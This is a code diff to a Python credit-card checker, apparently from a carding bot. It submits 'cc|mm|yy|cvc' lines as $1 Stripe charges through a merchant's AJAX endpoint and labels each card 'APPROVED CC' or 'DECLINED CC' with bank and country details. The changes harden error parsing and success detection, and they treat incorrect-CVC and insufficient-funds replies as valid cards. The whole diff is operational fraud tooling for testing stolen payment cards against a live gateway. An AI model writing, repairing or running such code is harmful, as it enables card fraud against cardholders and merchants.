@@ -9,7 +9,6 @@ import string
 from urllib.parse import urlparse
 from requests.adapters import HTTPAdapter
 from requests.packages.urllib3.util.retry import Retry
-from user_agent import generate_user_agent
 
 # Developer info
 dev = "@mhitzxg"
@@ -180,97 +179,126 @@ def get_country_emoji(country_code):
         return ''
 
 def extract_error_from_response(response_text):
-    """Extract error message from response text"""
+    """Extract error message from response text - FIXED FOR EMPTY RESPONSES"""
     try:
-        if response_text.strip():
-            try:
-                data = json.loads(response_text)
-                if isinstance(data, dict):
-                    if 'error' in data:
-                        error_msg = data['error'].get('message', '')
-                        if error_msg:
-                            return error_msg
-                    
-                    if 'data' in data and 'error' in data['data']:
-                        error_msg = data['data']['error'].get('message', '')
-                        if error_msg:
-                            return error_msg
-                    
-                    if 'message' in data:
-                        return data['message']
-            except:
-                pass
+        # If response is empty or just whitespace
+        if not response_text or response_text.strip() == '':
+            return "Empty response from server"
         
-        patterns = [
-            r'"message"\s*:\s*"([^"]+)"',
-            r'"error"\s*:\s*{[^}]*"message"\s*:\s*"([^"]+)"',
-            r'error\s*:\s*"([^"]+)"',
-            r'decline[^"]*"([^"]+)"',
-            r'declined[^"]*"([^"]+)"',
-            r'incorrect[^"]*"([^"]+)"',
-            r'invalid[^"]*"([^"]+)"',
-            r'expired[^"]*"([^"]+)"',
-            r'cvc[^"]*"([^"]+)"',
-            r'security[^"]*"([^"]+)"',
-        ]
+        # Try to parse as JSON first
+        try:
+            data = json.loads(response_text)
+            
+            # Check for common success/error patterns
+            if isinstance(data, dict):
+                # Check for success message
+                if data.get('success') == True:
+                    return "CHARGED 1$"
+                
+                # Check for error in different formats
+                if 'error' in data:
+                    error_msg = data['error']
+                    if isinstance(error_msg, dict) and 'message' in error_msg:
+                        return str(error_msg['message'])
+                    elif isinstance(error_msg, str):
+                        return error_msg
+                    else:
+                        return str(error_msg)
+                
+                if 'data' in data and isinstance(data['data'], dict) and 'error' in data['data']:
+                    error_data = data['data']['error']
+                    if isinstance(error_data, dict) and 'message' in error_data:
+                        return str(error_data['message'])
+                
+                if 'message' in data:
+                    return str(data['message'])
+                
+                # Check for Stripe error format
+                if 'error' in data and isinstance(data['error'], dict) and 'message' in data['error']:
+                    return str(data['error']['message'])
+                
+                # If we have data but no clear message, return the JSON
+                return json.dumps(data)[:200]
         
-        for pattern in patterns:
-            match = re.search(pattern, response_text, re.IGNORECASE)
-            if match:
-                error_msg = match.group(1)
-                error_msg = error_msg.replace('\\"', '"').replace('\\/', '/')
-                return error_msg
+        except json.JSONDecodeError:
+            # Not JSON, try to extract from text
+            
+            # Clean the response text
+            cleaned_text = response_text.strip()
+            
+            # Look for common error patterns in text
+            error_patterns = [
+                (r'decline[^"]*"([^"]+)"', 'Declined'),
+                (r'error[^"]*"([^"]+)"', 'Error'),
+                (r'invalid[^"]*"([^"]+)"', 'Invalid'),
+                (r'incorrect[^"]*"([^"]+)"', 'Incorrect'),
+                (r'failed[^"]*"([^"]+)"', 'Failed'),
+                (r'cannot[^"]*"([^"]+)"', 'Cannot process'),
+                (r'unable[^"]*"([^"]+)"', 'Unable to process'),
+                (r'card was declined', 'Card was declined'),
+                (r'insufficient funds', 'Insufficient funds'),
+                (r'security code.*incorrect', 'Security code incorrect'),
+                (r'cvc.*incorrect', 'CVC incorrect'),
+                (r'expired', 'Card expired'),
+                (r'invalid number', 'Invalid card number'),
+            ]
+            
+            for pattern, default_msg in error_patterns:
+                match = re.search(pattern, cleaned_text, re.IGNORECASE)
+                if match:
+                    if len(match.groups()) > 0 and match.group(1):
+                        return match.group(1)
+                    else:
+                        return default_msg
+            
+            # Look for HTML error messages
+            if '<' in cleaned_text and '>' in cleaned_text:
+                # Try to extract text from HTML
+                text_only = re.sub(r'<[^>]+>', ' ', cleaned_text)
+                text_only = ' '.join(text_only.split())
+                if text_only and len(text_only) > 10:
+                    return text_only[:150]
+            
+            # If text is short, return it
+            if len(cleaned_text) < 200:
+                return cleaned_text if cleaned_text else "Empty response"
+            
+            # Otherwise return first 150 chars
+            return cleaned_text[:150] + "..."
         
-        response_lower = response_text.lower()
-        error_indicators = [
-            ('declined', 'Your card was declined.'),
-            ('insufficient', 'Your card has insufficient funds.'),
-            ('expired', 'Your card has expired.'),
-            ('invalid', 'Your card number is invalid.'),
-            ('cvc', 'Your card\'s security code is incorrect.'),
-            ('security', 'Your card\'s security code is incorrect.'),
-            ('incorrect_cvc', 'Your card\'s security code is incorrect.'),
-            ('do_not_honor', 'Your card was declined.'),
-            ('pickup_card', 'Your card has been reported lost or stolen.'),
-            ('restricted_card', 'Your card is restricted.'),
-            ('card_not_supported', 'Your card is not supported.'),
-            ('generic_decline', 'Your card was declined.'),
-            ('transaction_not_allowed', 'Transaction not allowed.'),
-        ]
-        
-        for indicator, message in error_indicators:
-            if indicator in response_lower:
-                return message
-        
-        return "Card declined."
-        
-    except:
-        return "Card declined."
+        except Exception as e:
+            return f"Error parsing response: {str(e)}"
+    
+    except Exception as e:
+        return f"Failed to extract error: {str(e)}"
 
 def get_final_message(response_text, response_obj=None):
-    """Extract final user-friendly message from response"""
+    """Extract final user-friendly message from response - FIXED"""
     try:
-        if response_obj and hasattr(response_obj, 'json'):
-            try:
-                data = response_obj.json()
-                if isinstance(data, dict):
-                    if data.get('success') == True:
-                        return "CHARGED 1$"
-                    
-                    if 'error' in data:
-                        error_msg = data['error'].get('message', '')
-                        if error_msg:
-                            return error_msg
-                    
-                    if 'message' in data:
-                        return data['message']
-            except:
-                pass
+        # If we have a response object, get its text
+        if response_obj and hasattr(response_obj, 'text'):
+            response_text = response_obj.text
         
-        error_msg = extract_error_from_response(response_text)
-        return error_msg
-    except:
-        return "Unknown response"
+        # If response_text is None or empty
+        if not response_text:
+            return "No response from server"
+        
+        # Extract the actual message
+        message = extract_error_from_response(response_text)
+        
+        # Clean up the message
+        message = message.strip()
+        if message.startswith(','):
+            message = message[1:].strip()
+        
+        # If message is still empty or just punctuation
+        if not message or message in [',', '.', ';', ':']:
+            return "No message in response"
+        
+        return message
+    
+    except Exception as e:
+        return f"Error getting message: {str(e)}"
 
 def test_charge(cc_line):
     start_time = time.time()
@@ -386,9 +414,12 @@ def test_charge(cc_line):
         
         elapsed_time = time.time() - start_time
         
-        if response_stripe.status_code != 200:
-            response_text = response_stripe.text
-            error_msg = get_final_message(response_text, response_stripe)
+        # Get Stripe response text
+        stripe_response_text = response_stripe.text if hasattr(response_stripe, 'text') else ""
+        stripe_status = response_stripe.status_code
+        
+        if stripe_status != 200:
+            error_msg = get_final_message(stripe_response_text, response_stripe)
             
             # Check for APPROVED responses (CVC incorrect or insufficient funds)
             if "Your card's security code is incorrect." in error_msg or "security code is incorrect" in error_msg.lower():
@@ -438,14 +469,16 @@ def test_charge(cc_line):
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
         
-        stripe_json = response_stripe.json()
-        
-        if 'error' in stripe_json:
-            error_msg = stripe_json['error'].get('message', 'Unknown Stripe Error')
+        # Try to parse Stripe JSON response
+        try:
+            stripe_json = response_stripe.json()
             
-            # Check for APPROVED responses
-            if "Your card's security code is incorrect." in error_msg or "security code is incorrect" in error_msg.lower():
-                return f"""
+            if 'error' in stripe_json:
+                error_msg = stripe_json['error'].get('message', 'Unknown Stripe Error')
+                
+                # Check for APPROVED responses
+                if "Your card's security code is incorrect." in error_msg or "security code is incorrect" in error_msg.lower():
+                    return f"""
 ✅ APPROVED CC
 
 💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
@@ -459,9 +492,9 @@ def test_charge(cc_line):
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
-            
-            if "Your card has insufficient funds." in error_msg or "insufficient funds" in error_msg.lower():
-                return f"""
+                
+                if "Your card has insufficient funds." in error_msg or "insufficient funds" in error_msg.lower():
+                    return f"""
 ✅ APPROVED CC
 
 💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
@@ -475,8 +508,8 @@ def test_charge(cc_line):
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
-            
-            return f"""
+                
+                return f"""
 ❌ DECLINED CC
 
 💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
@@ -490,8 +523,43 @@ def test_charge(cc_line):
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
+            
+            payment_method_id = stripe_json.get("id", "")
+            
+        except json.JSONDecodeError:
+            # If Stripe response is not valid JSON
+            error_msg = get_final_message(stripe_response_text)
+            return f"""
+❌ STRIPE ERROR
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
         
-        payment_method_id = stripe_json["id"]
+        if not payment_method_id:
+            error_msg = "Failed to get payment method ID from Stripe"
+            return f"""
+❌ STRIPE ERROR
+
+💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
+🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
         
         # AJAX request cookies and headers
         cookies_ajax = {
@@ -592,19 +660,50 @@ def test_charge(cc_line):
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
         
+        # Get AJAX response
+        ajax_response_text = response_ajax.text if hasattr(response_ajax, 'text') else ""
+        ajax_status = response_ajax.status_code
+        
         # Get final message
-        response_text = response_ajax.text
-        final_message = get_final_message(response_text, response_ajax)
+        final_message = get_final_message(ajax_response_text, response_ajax)
         elapsed_time = time.time() - start_time
         
+        # Clean up the final message
+        final_message = final_message.strip()
+        if final_message.startswith(','):
+            final_message = final_message[1:].strip()
+        
         # Check for success (CHARGED 1$ should only show when actually charged)
-        response_text_lower = response_text.lower()
+        ajax_response_lower = ajax_response_text.lower()
+        
+        # Debug: Print raw response for troubleshooting
+        print(f"DEBUG - Raw AJAX response: {ajax_response_text[:200]}...")
         
         # Only show "CHARGED 1$" when we have actual success
-        if (final_message == "CHARGED 1$" or 
-            'success' in response_text_lower and 'true' in response_text_lower or
-            any(keyword in response_text_lower for keyword in ['payment successful', 'thank you', 'approved', 'charged', 'success', '"success":true'])):
-            
+        is_success = False
+        success_indicators = [
+            '"success":true',
+            'payment successful',
+            'thank you for your payment',
+            'transaction successful',
+            'payment approved',
+            'charge successful',
+        ]
+        
+        for indicator in success_indicators:
+            if indicator in ajax_response_lower:
+                is_success = True
+                break
+        
+        # Also check JSON structure
+        try:
+            ajax_json = json.loads(ajax_response_text)
+            if isinstance(ajax_json, dict) and ajax_json.get('success') == True:
+                is_success = True
+        except:
+            pass
+        
+        if is_success:
             return f"""
 ✅ APPROVED CC
 
@@ -653,12 +752,12 @@ def test_charge(cc_line):
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
         
-        # Otherwise, it's declined
+        # If we get here, it's declined
         return f"""
 ❌ DECLINED CC
 
 💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
-🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message if final_message else 'Card declined'}
 💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
